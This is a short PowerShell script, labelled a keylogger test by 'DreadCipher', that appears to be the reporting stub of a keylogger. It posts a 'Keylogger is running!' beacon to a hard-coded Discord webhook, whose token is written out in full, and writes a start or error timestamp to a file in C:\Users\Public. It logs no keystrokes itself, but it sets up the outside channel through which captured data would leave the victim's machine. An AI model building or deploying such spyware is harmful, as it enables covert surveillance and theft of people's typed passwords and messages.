# Keylogger Test by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"

try {
    $payload = @{ content = "Keylogger is running!" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
    "Started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
} catch {
    "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
}
